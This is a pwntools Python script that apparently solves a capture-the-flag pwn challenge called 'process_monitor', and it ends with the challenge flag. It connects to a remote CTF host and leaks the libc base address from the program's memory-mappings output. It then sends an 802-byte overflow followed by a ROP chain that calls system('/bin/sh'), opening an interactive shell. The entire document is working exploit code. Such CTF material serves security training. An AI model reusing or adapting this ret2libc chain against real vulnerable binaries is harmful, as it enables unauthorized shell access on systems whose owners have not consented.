#!/usr/bin/env python3
from pwn import *

#exe = context.binary = ELF('process_monitor')
exe = context.binary = ELF('process_monitor_patched')
libc = ELF("./libc.so.6")
context.terminal = ["tmux", "splitw", "-h"]

host = args.HOST or 'io.ept.gg'
port = int(args.PORT or 30001)

#host = args.HOST or 'localhost'
#port = int(args.PORT or 1024)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Connect to the process on the remote host'''
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

gdbscript = '''
#tbreak main
continue
'''.format(**locals())

# -- Exploit goes here --

io = start()

def details(pid: bytes, wait=True):
    io.sendlineafter(b"Enter your choice", b"2")
    io.sendlineafter(b"Enter the PID", pid)

    if not wait:
        return

    io.recvuntil(b"Memory Mappings:")
    io.recvline()
    data = [line.strip().split() for line in io.recvuntil(b"Menu:").split(b"\n")]
    data = [line for line in data if len(line) == 6]
    # for d in data:
    #     print(d)
    return data
    

# GET PID
io.sendlineafter(b"Enter your", b"1.")
lines = io.recvuntil(b"\n\n")
lines = [line.strip().split() for line in lines.split(b"\n")][1:]
possible_pids = []
for line in lines:
    if len(line) != 3:
        continue
    if b'process_monitor' in line[2]:
       print(line)
       possible_pids.append(line[1])

pid = possible_pids[0]
print(f"INFO: PID IS {pid}")


# GET MAPS
maps = details(pid)

libc_start = next(m for m in maps if b"libc.so" in m[-1])[0]
print(libc_start)
libc.address = int(libc_start.split(b"-")[0], 16)
print((hex(libc.address)))
print("system", hex(libc.symbols["system"]))

rop2 = ROP(libc)
ret = rop2.find_gadget(["ret"])[0]
pop_rdi = rop2.find_gadget(["pop rdi", "ret"])[0]
pop_rsi = rop2.find_gadget(["pop rsi", "ret"])[0]
pop_rax = rop2.find_gadget(["pop rax", "ret"])[0]

PAYLOAD = b"A" * 802

PAYLOAD += p64(pop_rdi)
PAYLOAD += p64(next(libc.search(b"/bin/sh\0")))

PAYLOAD += p64(pop_rsi)
PAYLOAD += p64(0)

PAYLOAD += p64(pop_rax)
PAYLOAD += p64(0)

PAYLOAD += p64(ret)


PAYLOAD += p64(libc.symbols["system"])

details(PAYLOAD, wait=False)

io.interactive()

# EPT{overfl0w_in_th3_m0n1t0r}$

